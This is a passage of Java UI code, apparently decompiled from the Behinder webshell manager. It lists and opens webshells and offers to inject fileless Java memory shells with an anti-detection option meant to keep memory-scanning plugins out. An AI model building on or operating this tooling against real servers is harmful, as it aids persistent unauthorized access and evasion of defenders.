                passText.setText(shellObj.getString("password"));
            } else {
                try {
                    List<TransProtocol> transProtocolList = this.transProtocolDao.findTransProtocolByType(shellType);
                    this.transProtocolCombo.getItems().clear();

                    for(TransProtocol transProtocol : transProtocolList) {
                        this.transProtocolCombo.getItems().add(transProtocol.getName());
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }

                transTypeGroup.selectToggle(customizedRadio);
                TransProtocol transProtocol = this.transProtocolDao.findTransProtocolById(shellObj.getInt("transProtocolId"));
                this.transProtocolCombo.getSelectionModel().select(transProtocol.getName());
                this.transProtocolCombo.setUserData(transProtocol.getId());
            }

            urlText.setText(shellObj.getString("url"));
            shellTypeCombo.setValue(shellType);
            shellCatagory.setValue(shellObj.getString("catagory"));
            header.setText(shellObj.getString("headers"));
            comment.setText(shellObj.getString("comment"));
        } else {
            transTypeGroup.selectToggle(legacyRadio);
        }

        shellTypeCombo.getSelectionModel().selectedItemProperty().addListener((options, oldValue, newValue) -> {
            try {
                List<TransProtocol> transProtocolList = this.transProtocolDao.findTransProtocolByType(newValue.toString());
                this.transProtocolCombo.getItems().clear();

                for(TransProtocol transProtocol : transProtocolList) {
                    this.transProtocolCombo.getItems().add(transProtocol.getName());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

        });
        this.transProtocolCombo.getSelectionModel().selectedItemProperty().addListener((opt, oldValue, newValue) -> {
            if (newValue != null) {
                try {
                    TransProtocol transProtocol = this.transProtocolDao.findTransProtocolByNameAndType(newValue.toString(), shellTypeCombo.getValue().toString());
                    this.transProtocolCombo.setUserData(transProtocol.getId());
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }
        });
        shellTypeCombo.setOnAction((event) -> {
        });
        urlText.textProperty().addListener((observable, oldValue, newValue) -> {
            URL url;
            try {
                url = new URL(urlText.getText().trim());
            } catch (Exception var8) {
                return;
            }

            String extension = url.getPath().substring(url.getPath().lastIndexOf(".") + 1).toLowerCase();

            for(int i = 0; i < shellTypeCombo.getItems().size(); ++i) {
                if (extension.toLowerCase().equals(shellTypeCombo.getItems().get(i))) {
                    shellTypeCombo.getSelectionModel().select(i);
                }
            }

        });
        Button saveBtn = new Button("保存");
        saveBtn.setDefaultButton(true);
        Button cancelBtn = new Button("取消");
        HBox buttonBox = new HBox();
        buttonBox.setSpacing((double)20.0F);
        buttonBox.getChildren().addAll(new Node[]{cancelBtn, saveBtn});
        buttonBox.setAlignment(Pos.BOTTOM_CENTER);
        vpsInfoPane.add(buttonBox, 0, 8);
        GridPane.setColumnSpan(buttonBox, 2);
        alert.getDialogPane().setContent(vpsInfoPane);
        if (shellID != -1) {
            JSONObject shellObj = this.shellManager.findShell(shellID);
            if (shellObj.getInt("transProtocolId") < 0) {
                passText.setText(shellObj.getString("password"));
            } else {
                TransProtocol transProtocol = this.transProtocolDao.findTransProtocolById(shellObj.getInt("transProtocolId"));
                this.transProtocolCombo.getSelectionModel().select(transProtocol.getName());
            }

            urlText.setText(shellObj.getString("url"));
            shellTypeCombo.setValue(shellObj.getString("type"));
            shellCatagory.setValue(shellObj.getString("catagory"));
            header.setText(shellObj.getString("headers"));
            comment.setText(shellObj.getString("comment"));
        }

        saveBtn.setOnAction((ex) -> {
            String url = urlText.getText().trim();
            if (this.checkUrl(url)) {
                String password = passText.getText();
                int transProtocolId = -1;
                if (!transTypeGroup.getSelectedToggle().getUserData().equals("legacy")) {
                    if (!this.checkTransProtocolId(this.transProtocolCombo)) {
                        return;
                    }

                    transProtocolId = (Integer)this.transProtocolCombo.getUserData();
                    password = "";
                } else if (!this.checkPassword(password)) {
                    return;
                }

                String type = shellTypeCombo.getValue().toString();
                String catagory = shellCatagory.getValue().toString();
                String commentStr = comment.getText();
                String headers = header.getText();
                String os = "";
                int status = Constants.SHELL_STATUS_ALIVE;
                int memType = Constants.MEMSHELL_TYPE_FILE;

                try {
                    if (shellID == -1) {
                        this.shellManager.addShell(url, transProtocolId, type, password, catagory, os, commentStr, headers, status, memType);
                    } else {
                        this.shellManager.updateShell(shellID, url, transProtocolId, type, password, catagory, commentStr, headers);
                    }

                    this.loadShellList();
                    return;
                } catch (Exception e1) {
                    this.showErrorMessage("保存失败", e1.getMessage());
                } finally {
                    alert.getDialogPane().getScene().getWindow().hide();
                }

            }
        });
        cancelBtn.setOnAction((ex) -> alert.getDialogPane().getScene().getWindow().hide());
        alert.showAndWait();
    }

    private void openShell(String url, String shellID, boolean offline) throws Exception {
        FXMLLoader loader = new FXMLLoader(this.getClass().getResource("/net/rebeyond/behinder/ui/MainWindow.fxml"));
        Parent mainWindow = (Parent)loader.load();
        MainWindowController mainWindowController = (MainWindowController)loader.getController();
        mainWindowController.init(this.shellManager.findShell(Integer.parseInt(shellID)), this.shellManager, currentProxy, offline);
        Stage stage = new Stage();
        stage.setTitle(url);
        stage.getIcons().add(new Image(new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/logo.jpg"))));
        stage.setUserData(url);
        Scene scene = new Scene(mainWindow);
        scene.getRoot().setStyle("-fx-font-family: 'Arial'");
        stage.setScene(scene);
        stage.setOnCloseRequest((e) -> {
            Runnable runner = () -> {
                List<Thread> workerList = mainWindowController.getWorkList();

                for(Thread worker : workerList) {
                    while(worker.isAlive()) {
                        try {
                            worker.stop();
                        } catch (Exception var6) {
                        } catch (Error var7) {
                        }
                    }
                }

                OKHttpClientUtil.clearSession(url);
                workerList.clear();
            };
            Thread worker = new Thread(runner);
            worker.start();
        });
        stage.show();
    }

    private void loadContextMenu() {
        ContextMenu cm = new ContextMenu();
        MenuItem openBtn = new MenuItem("打开");
        cm.getItems().add(openBtn);
        MenuItem openOfflineBtn = new MenuItem("打开(离线模式)");
        cm.getItems().add(openOfflineBtn);
        MenuItem addBtn = new MenuItem("新增");
        cm.getItems().add(addBtn);
        MenuItem editBtn = new MenuItem("编辑");
        cm.getItems().add(editBtn);
        MenuItem delBtn = new MenuItem("删除");
        cm.getItems().add(delBtn);
        MenuItem copyBtn = new MenuItem("复制URL");
        cm.getItems().add(copyBtn);
        MenuItem memShellBtn = new MenuItem("注入内存马");
        cm.getItems().add(memShellBtn);
        SeparatorMenuItem separatorBtn = new SeparatorMenuItem();
        cm.getItems().add(separatorBtn);
        MenuItem refreshBtn = new MenuItem("刷新");
        cm.getItems().add(refreshBtn);
        this.shellListTable.setContextMenu(cm);
        openBtn.setOnAction((event) -> {
            String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_URL)).getValue();
            String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();

            try {
                this.openShell(url, shellID, false);
            } catch (Exception e) {
                e.printStackTrace();
                this.statusLabel.setText("shell打开失败。");
            }

        });
        openOfflineBtn.setOnAction((event) -> {
            String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_URL)).getValue();
            String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();

            try {
                this.openShell(url, shellID, true);
            } catch (Exception e) {
                e.printStackTrace();
                this.statusLabel.setText("shell打开失败。");
            }

        });
        addBtn.setOnAction((event) -> {
            try {
                this.showShellDialog(-1);
            } catch (Exception e) {
                this.showErrorMessage("错误", "新增失败：" + e.getMessage());
                e.printStackTrace();
            }

        });
        editBtn.setOnAction((event) -> {
            String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();

            try {
                this.showShellDialog(Integer.parseInt(shellID));
            } catch (Exception e) {
                this.showErrorMessage("错误", "编辑失败：" + e.getMessage());
                e.printStackTrace();
            }

        });
        delBtn.setOnAction((event) -> {
            int size = this.shellListTable.getSelectionModel().getSelectedItems().size();
            Alert alert = new Alert(AlertType.CONFIRMATION);
            alert.setResizable(true);
            alert.setHeaderText("");
            alert.setContentText("请确认是否删除？");
            Optional<ButtonType> result = alert.showAndWait();
            if (result.get() == ButtonType.OK) {
                for(Object item : this.shellListTable.getSelectionModel().getSelectedItems()) {
                    String shellID = ((StringProperty)((List)item).get(this.COL_INDEX_ID)).getValue();

                    try {
                        this.shellManager.deleteShell(Integer.parseInt(shellID));
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }

                try {
                    this.loadShellList();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        });
        copyBtn.setOnAction((event) -> {
            String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_URL)).getValue();
            this.copyString(url);
        });
        memShellBtn.setOnAction((event) -> {
            String scriptType = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_TYPE)).getValue();
            String url = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_URL)).getValue();
            if (!scriptType.equals("jsp")) {
                Utils.showErrorMessage("提示", "内存马植入目前仅支持Java");
            } else {
                Alert inputDialog = new Alert(AlertType.NONE);
                inputDialog.setWidth((double)300.0F);
                inputDialog.setResizable(true);
                inputDialog.setTitle("注入内存马");
                Window window = inputDialog.getDialogPane().getScene().getWindow();
                window.setOnCloseRequest((e) -> window.hide());
                GridPane injectGridPane = new GridPane();
                injectGridPane.setVgap((double)15.0F);
                injectGridPane.setPadding(new Insets((double)20.0F, (double)20.0F, (double)0.0F, (double)10.0F));
                Label typeLabel = new Label("注入类型：");
                ComboBox typeCombo = new ComboBox();
                typeCombo.setItems(FXCollections.observableArrayList(new String[]{"AgentNoFile", "Agent"}));
                typeCombo.getSelectionModel().selectedItemProperty().addListener((options, oldValue, newValue) -> {
                    if (!newValue.equals("Filter") && newValue.equals("Servlet")) {
                    }

                });
                typeCombo.getSelectionModel().select(0);
                Label pathLabel = new Label("注入路径：");
                pathLabel.setAlignment(Pos.CENTER_RIGHT);
                TextField pathText = new TextField();
                pathText.setPrefWidth((double)300.0F);
                pathText.setPromptText(String.format("支持正则表达式，如%smemshell.*", Utils.getContextPath(url)));
                pathText.focusedProperty().addListener((obs, oldVal, newVal) -> {
                    if (pathText.getText().equals("")) {
                        pathText.setText(Utils.getContextPath(url) + "memshell");
                    }

                });
                CheckBox antiAgentCheckBox = new CheckBox("防检测");
                Label antiAgentMemo = new Label("*防检测可避免目标JVM进程被注入，可避免内存查杀插件注入，同时容器重启前内存马也无法再次注入");
                antiAgentMemo.setTextFill(Color.RED);
                Button cancelBtn = new Button("取消");
                Button saveBtn = new Button("保存");
                saveBtn.setDefaultButton(true);
                saveBtn.setOnAction((e) -> {
                    String shellID = ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();
                    String type = typeCombo.getValue().toString();
                    this.injectMemShell(Integer.parseInt(shellID), type, pathText.getText().trim(), antiAgentCheckBox.isSelected());
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                });
                cancelBtn.setOnAction((e) -> inputDialog.getDialogPane().getScene().getWindow().hide());
                injectGridPane.add(typeLabel, 0, 0);
                injectGridPane.add(typeCombo, 1, 0);
                injectGridPane.add(pathLabel, 0, 1);
                injectGridPane.add(pathText, 1, 1);
                injectGridPane.add(antiAgentCheckBox, 0, 2);
                injectGridPane.add(antiAgentMemo, 0, 3, 2, 1);
                HBox buttonBox = new HBox();
                buttonBox.setSpacing((double)20.0F);
                buttonBox.setAlignment(Pos.CENTER);
                buttonBox.getChildren().add(cancelBtn);
                buttonBox.getChildren().add(saveBtn);
                GridPane.setColumnSpan(buttonBox, 2);
                injectGridPane.add(buttonBox, 0, 4);
                inputDialog.getDialogPane().setContent(injectGridPane);
                inputDialog.showAndWait();
            }
        });
        refreshBtn.setOnAction((event) -> {
            try {
                this.loadShellList();
            } catch (Exception e) {
                e.printStackTrace();
            }

        });
    }

    private int getMemTypeFromType(String type) {
        if (type.equals("Agent")) {
            return Constants.MEMSHELL_TYPE_AGENT;
        } else if (type.equals("AgentNoFile")) {
            return Constants.MEMSHELL_TYPE_AGENT;
        } else if (type.equals("Filter")) {
            return Constants.MEMSHELL_TYPE_FILTER;
        } else {
            return type.equals("Servlet") ? Constants.MEMSHELL_TYPE_SERVLET : Constants.MEMSHELL_TYPE_FILE;
        }
    }

    private void addShell(JSONObject shellEntity) throws Exception {
        String url = Utils.getOrDefault(shellEntity, "url", String.class);
        String password = Utils.getOrDefault(shellEntity, "password", String.class);
        String type = Utils.getOrDefault(shellEntity, "type", String.class);
        String catagory = Utils.getOrDefault(shellEntity, "catagory", String.class);
        String os = Utils.getOrDefault(shellEntity, "os", String.class);
        String comment = Utils.getOrDefault(shellEntity, "comment", String.class);
        String headers = Utils.getOrDefault(shellEntity, "headers", String.class);
        int status = Integer.parseInt(Utils.getOrDefault(shellEntity, "status", Integer.TYPE));
        int memType = Integer.parseInt(Utils.getOrDefault(shellEntity, "memType", Integer.TYPE));
        int transProtocolId = Integer.parseInt(Utils.getOrDefault(shellEntity, "transProtocolId", Integer.TYPE));
        this.shellManager.addShell(url, transProtocolId, type, password, catagory, os, comment, headers, status, memType);
    }

    private void loadShellList() throws Exception {
        this.searchShellTxt.setText("");
        this.shellListTable.getItems().clear();
        JSONArray shellList = this.shellManager.listShell();
        this.fillShellRows(shellList);
    }

    private void fillShellRows(JSONArray jsonArray) {
        ObservableList<List<StringProperty>> data = FXCollections.observableArrayList();

        for(int i = 0; i < jsonArray.length(); ++i) {
            JSONObject rowObj = jsonArray.getJSONObject(i);

            try {
                int id = rowObj.getInt("id");
                String url = rowObj.getString("url");
                String ip = rowObj.getString("ip");
                String type = rowObj.getString("type");
                String os = rowObj.getString("os");
                String comment = rowObj.getString("comment");
                SimpleDateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
                String addTime = df.format(new Timestamp(rowObj.getLong("addtime")));
                int status = rowObj.getInt("status");
                int memType = rowObj.getInt("memType");
                List<StringProperty> row = new ArrayList();
                row.add(this.COL_INDEX_URL, new SimpleStringProperty(url));
                row.add(this.COL_INDEX_IP, new SimpleStringProperty(ip));
                row.add(this.COL_INDEX_TYPE, new SimpleStringProperty(type));
                row.add(this.COL_INDEX_OS, new SimpleStringProperty(os));
                row.add(this.COL_INDEX_COMMENT, new SimpleStringProperty(comment));
                row.add(this.COL_INDEX_ADDTIME, new SimpleStringProperty(addTime));
                row.add(this.COL_INDEX_STATUS, new SimpleStringProperty(status + ""));
                row.add(this.COL_INDEX_ID, new SimpleStringProperty(id + ""));
                row.add(this.COL_INDEX_MEMTYPE, new SimpleStringProperty(memType + ""));
                data.add(row);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        this.shellListTable.setItems(data);
    }

    private void copyString(String str) {
        Clipboard clipboard = Clipboard.getSystemClipboard();
        ClipboardContent content = new ClipboardContent();
        content.putString(str);
        clipboard.setContent(content);
    }

    private void showErrorMessage(String title, String msg) {
        Alert alert = new Alert(AlertType.ERROR);
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((event) -> window.hide());
        alert.setTitle(title);
        alert.setHeaderText("");
        alert.setContentText(msg);
        alert.show();
    }

    private void initCatagoryMenu() {
        ContextMenu treeContextMenu = new ContextMenu();
        MenuItem addCatagoryBtn = new MenuItem("新增");
        treeContextMenu.getItems().add(addCatagoryBtn);
        MenuItem delCatagoryBtn = new MenuItem("删除");
        treeContextMenu.getItems().add(delCatagoryBtn);
        addCatagoryBtn.setOnAction((event) -> {
            Alert alert = new Alert(AlertType.CONFIRMATION);
            alert.setTitle("新增分类");
            alert.setHeaderText("");
            GridPane panel = new GridPane();
            Label cataGoryNameLable = new Label("请输入分类名称：");
            TextField cataGoryNameTxt = new TextField();
            Label cataGoryCommentLable = new Label("请输入分类描述：");
            TextField cataGoryCommentTxt = new TextField();
            panel.add(cataGoryNameLable, 0, 0);
            panel.add(cataGoryNameTxt, 1, 0);
            panel.add(cataGoryCommentLable, 0, 1);
            panel.add(cataGoryCommentTxt, 1, 1);
            panel.setVgap((double)20.0F);
            alert.getDialogPane().setContent(panel);
            Optional<ButtonType> result = alert.showAndWait();
            if (result.get() == ButtonType.OK) {
                try {
                    if (this.shellManager.addCatagory(cataGoryNameTxt.getText(), cataGoryCommentTxt.getText()) > 0) {
                        this.statusLabel.setText("分类新增完成");
                        this.initCatagoryTree();
                    }
                } catch (Exception e) {
                    this.statusLabel.setText("分类新增失败：" + e.getMessage());
                    e.printStackTrace();
                }
            }

        });
        delCatagoryBtn.setOnAction((event) -> {
            if (this.catagoryTreeView.getSelectionModel().getSelectedItem() != null) {
                Alert alert = new Alert(AlertType.CONFIRMATION);
                alert.setHeaderText("");
                alert.setContentText("请确认是否删除？仅删除分类信息，不会删除该分类下的网站。");
                Optional<ButtonType> result = alert.showAndWait();
                if (result.get() == ButtonType.OK) {
                    try {
                        String cataGoryName = ((TreeItem)this.catagoryTreeView.getSelectionModel().getSelectedItem()).getValue().toString();
                        if (this.shellManager.deleteCatagory(cataGoryName) > 0) {
                            this.statusLabel.setText("分类删除完成");
                            this.initCatagoryTree();
                        }
                    } catch (Exception e) {
                        this.statusLabel.setText("分类删除失败：" + e.getMessage());
                        e.printStackTrace();
                    }
                }

            }
        });
        this.catagoryTreeView.setContextMenu(treeContextMenu);
        this.catagoryTreeView.setOnMouseClicked((event) -> {
            TreeItem currentTreeItem = (TreeItem)this.catagoryTreeView.getSelectionModel().getSelectedItem();
            if (currentTreeItem.isLeaf()) {
                String catagoryName = currentTreeItem.getValue().toString();

                try {
                    this.shellListTable.getItems().clear();
                    JSONArray shellList = this.shellManager.findShellByCatagory(catagoryName);
                    this.fillShellRows(shellList);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            } else {
                try {
                    this.shellListTable.getItems().clear();
                    this.loadShellList();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }

        });
    }

    private void initCatagoryTree() throws Exception {
        JSONArray catagoryList = this.shellManager.listCatagory();
        TreeItem<String> rootItem = new TreeItem("分类列表", new ImageView());

        for(int i = 0; i < catagoryList.length(); ++i) {
            JSONObject catagoryObj = catagoryList.getJSONObject(i);
            TreeItem<String> treeItem = new TreeItem(catagoryObj.getString("name"));
            rootItem.getChildren().add(treeItem);
        }

        rootItem.setExpanded(true);
        this.catagoryTreeView.setRoot(rootItem);
        this.catagoryTreeView.getSelectionModel().select(rootItem);
    }

    private void importData() throws Exception {
        FileChooser fileChooser = new FileChooser();
        fileChooser.setTitle("请选择需要导入的data.db文件");
        File selectdFile = fileChooser.showOpenDialog(this.shellListTable.getScene().getWindow());
        if (selectdFile != null) {
            String dbPath = selectdFile.getAbsolutePath();
            ShellManager oldShellManager = new ShellManager(dbPath);
            JSONArray shells = oldShellManager.listShell();
            Runnable runner = () -> {
                int count = 0;
                int duplicateCount = 0;

                for(int i = 0; i < shells.length(); ++i) {
                    JSONObject shellEntity = shells.getJSONObject(i);

                    try {
                        int finalCount = count;
                        Platform.runLater(() -> this.statusLabel.setText(String.format("正在导入%d/%d...", finalCount, shells.length())));
                        this.addShell(shellEntity);
                        ++count;
                    } catch (Exception e) {
                        if (e.getMessage().equals("该URL已存在")) {
                            ++duplicateCount;
                        }
                    }
                }

                int finalDuplicateCount = duplicateCount;
                int finalCount1 = count;
                Platform.runLater(() -> {
                    this.statusLabel.setText("导入完成。");
                    Utils.showInfoMessage("提示", String.format("导入完成，共有%d条数据，%d条数据已存在，新导入%d数据，", shells.length(), finalDuplicateCount, finalCount1));

                    try {
                        this.loadShellList();
                    } catch (Exception var5) {
                    }

                });
                oldShellManager.closeConnection();
            };
            Thread worker = new Thread(runner);
            worker.start();
        }
    }

    private String getSelectedShellID() {
        return ((StringProperty)((List)this.shellListTable.getSelectionModel().getSelectedItem()).get(this.COL_INDEX_ID)).getValue();
    }

    private int getShellID(ArrayList<SimpleStringProperty> item) {
        return Integer.parseInt(((SimpleStringProperty)item.get(this.COL_INDEX_ID)).getValue());
    }

    private String getShellUrl(ArrayList<SimpleStringProperty> item) {
        return ((SimpleStringProperty)item.get(this.COL_INDEX_URL)).getValue();
    }
}
